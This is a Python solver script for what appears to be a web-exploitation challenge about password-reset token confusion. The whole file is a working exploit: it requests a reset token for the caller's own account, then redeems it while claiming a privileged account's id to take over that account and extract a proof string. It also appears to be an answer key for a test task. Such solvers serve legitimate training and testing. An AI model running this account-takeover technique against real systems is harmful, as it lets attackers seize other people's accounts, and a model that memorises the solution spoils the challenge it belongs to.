#!/usr/bin/env python3
"""Solver for web-exploitation-day-17-reset-expectations (release day 25).

Bug class: password-reset token / account-id confusion ("broken object binding" on
a recovery token). `/api/clues` discloses feature_route (request a reset token for
an account) and secondary_route (redeem a token to complete recovery), plus
recovery_guide_route (`/api/recovery`), which lists the account_parameter/
token_parameter names and the accounts in play - a self-service one (ours) and a
non-self-service one (the target, e.g. "Executive account").

The request route only lets the caller request a token for a self-service account
(any other account_id -> `self_service_only`). But the redeem route does not bind
the issued token to the account_id it was issued for: requesting a token for OUR
own self-service account and then redeeming it while claiming the OTHER account's
id completes "recovery" for that other account and discloses the proof.

Stdlib only. Talks only to the one target origin it is given. Generic: derives the
routes, parameter names and account ids from the live target instead of hardcoding
anything.
"""
import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
TIMEOUT = 30
DELAY = 0.8
PROOF_RE = re.compile(r"proof_[0-9a-fA-F]{16,}")


def _get_json(base, path, save_dir=None, name=None):
    url = base.rstrip("/") + path
    req = urllib.request.Request(url, headers={"User-Agent": UA})
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            status, body = resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as err:
        status, body = err.code, err.read().decode("utf-8", "replace")
    if save_dir and name:
        save_dir.mkdir(parents=True, exist_ok=True)
        (save_dir / f"{name}.json").write_text(
            json.dumps({"status": status, "url": url, "body": body}, indent=2))
    try:
        return status, json.loads(body)
    except ValueError:
        return status, None


def solve_reset_confusion(base, evidence_dir=None):
    """Request-a-token-for-self / redeem-claiming-other-account confusion.

    Returns the proof_<hex> string, or None if this target does not match the
    expected shape (clues missing the needed fields, or no self/other account
    pairing disclosed)."""
    status, clues = _get_json(base, "/api/clues", evidence_dir, "clues")
    if status != 200 or not clues:
        return None
    feature = clues.get("feature_route")
    secondary = clues.get("secondary_route")
    guide_route = clues.get("recovery_guide_route", "/api/recovery")
    if not feature or not secondary:
        return None

    status, guide = _get_json(base, guide_route, evidence_dir, "recovery_guide")
    if status != 200 or not guide:
        return None
    account_param = guide.get("account_parameter", "account_id")
    token_param = guide.get("token_parameter", "token")
    accounts = guide.get("accounts", [])
    self_accounts = [a["id"] for a in accounts if a.get("self_service")]
    other_accounts = [a["id"] for a in accounts if not a.get("self_service")]
    if not self_accounts or not other_accounts:
        return None

    for self_id in self_accounts:
        time.sleep(DELAY)
        query = urllib.parse.urlencode({account_param: self_id})
        status, issued = _get_json(base, f"{feature}?{query}", evidence_dir, f"request_{self_id}")
        if status != 200 or not issued or not issued.get("ok"):
            continue
        token = issued.get("token")
        if not token:
            continue
        for other_id in other_accounts:
            time.sleep(DELAY)
            query = urllib.parse.urlencode({token_param: token, account_param: other_id})
            status, redeemed = _get_json(base, f"{secondary}?{query}", evidence_dir,
                                          f"redeem_{self_id}_as_{other_id}")
            if status == 200 and isinstance(redeemed, dict):
                match = PROOF_RE.search(json.dumps(redeemed))
                if match:
                    return match.group(0)
    return None


def main():
    if len(sys.argv) < 2:
        print(f"usage: {sys.argv[0]} <target_base_url> [evidence_dir]", file=sys.stderr)
        sys.exit(1)
    base = sys.argv[1]
    evidence_dir = None
    if len(sys.argv) > 2:
        from pathlib import Path
        evidence_dir = Path(sys.argv[2])
    proof = solve_reset_confusion(base, evidence_dir)
    if proof:
        print(proof)
    else:
        print("NOT SOLVED", file=sys.stderr)
        sys.exit(2)


if __name__ == "__main__":
    main()
